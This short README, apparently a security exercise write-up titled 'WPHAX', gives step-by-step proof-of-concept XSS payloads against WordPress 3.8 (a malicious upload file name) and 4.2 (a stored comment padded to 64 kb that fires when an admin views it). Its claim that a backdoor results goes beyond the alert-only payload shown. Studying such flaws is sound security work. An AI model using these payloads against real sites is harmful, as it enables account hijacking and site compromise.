# WPHAX 

## **Exploit 1**
WP Version used: **3.8**

**Description:**
"Upload media" section can be hacked with **XSS**.

**Steps:**

* Go to **Upload Media** menu.
* Upload a file which is more than **20MB** with *"file<img src=x onerror=alert("hacked")>.png"* name.

![Our user is author, so can upload media](https://i.imgur.com/z6pj5HV.png)
![Upload Media](https://i.imgur.com/Ad0wZIt.png)
![XSS](https://i.imgur.com/aRp2L62.png)

## **Exploit 2**
WP Version used: **4.2**

**Description:**
Stored **XSS** can be executed with malicious comment.

**Steps:**

* Leave a comment:

`<a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  AAAAAAAAAAAA...[64 kb]..AAA'></a>`
* Wait for admin to view the comment on the page
* Backdoor is now available

![Leave the comment](https://i.imgur.com/VVD3ZqO.png)
![View as admin](https://i.imgur.com/wwVBiiG.png)

